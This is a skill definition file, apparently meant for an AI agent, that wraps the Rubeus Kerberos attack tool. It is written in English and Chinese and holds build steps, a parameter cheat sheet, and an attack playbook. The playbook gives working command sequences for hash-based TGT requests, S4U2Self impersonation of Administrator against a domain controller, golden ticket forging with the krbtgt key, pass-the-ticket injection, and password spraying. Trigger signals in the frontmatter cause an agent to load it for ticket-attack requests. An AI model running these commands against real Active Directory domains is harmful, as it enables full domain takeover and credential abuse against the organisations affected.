---
name: rubeus-kerberos
description: "Rubeus: Forges Domain Admin tickets via S4U2Self and golden tickets. Signals: Kerberos, ticket attack, request TGT, S4U delegation, ticket renewal."
zh-signals: "Rubeus: 普通用户伪造域管票据(S4U2Self)、黄金票据恢复域管。信号:kerberos,票据攻击,请求 TGT,S4U 委派,票据续期。"
---

# Rubeus

- 攻击大类:C26 Kerberos与票据攻击
- 上游仓库:https://github.com/GhostPack/Rubeus
- 上游 License:BSD-3-Clause(GhostPack)(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/GhostPack/Rubeus && cd Rubeus && dotnet build -c Release
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `asktgt /user:x /password:y` | 请求 TGT |
| `asktgt /user:x /rc4:<hash>` | 哈希请求 TGT(PtH 票据化) |
| `s4u /ticket:<base64> /impersonateuser:admin /msdsspn:cifs/tgt` | S4U 委派 |
| `dump /service:krbtgt` | 导出票据(需 elevated) |
| `renew /ticket:<kirbi>` | 票据续期 |
| `purge` | 清空当前会话票据 |
| `brute /password:Passw0rd! /noticket` | 口令喷洒检测 |
| `tgssub /ticket:<b64> /altservice:cifs,host,http` | 票据服务名替换(引到更多服务) |
| `monitor /interval:10` | 实时监听 4624 并自动请求票据 |

## 攻击场景 Playbook

### 普通用户伪造域管票据(S4U2Self)

```bash
Rubeus.exe asktgt /user:svc_sql /rc4:<NT> /domain:corp.local
Rubeus.exe s4u /ticket:<上一步TGT.kirbi> /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /ptt
dir \\dc01.corp.local\c$
```

### 黄金票据恢复域管

```bash
Rubeus.exe golden /aes256:<krbtgt-aes> /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx
Rubeus.exe ptt /ticket:<golden.kirbi>
lsadump::dcsync 可换成 secretsdump.py
```

## 注意事项

Windows 上运行;Linux 侧等价操作用 impacket 脚本。ptt = pass-the-ticket 注入当前会话。
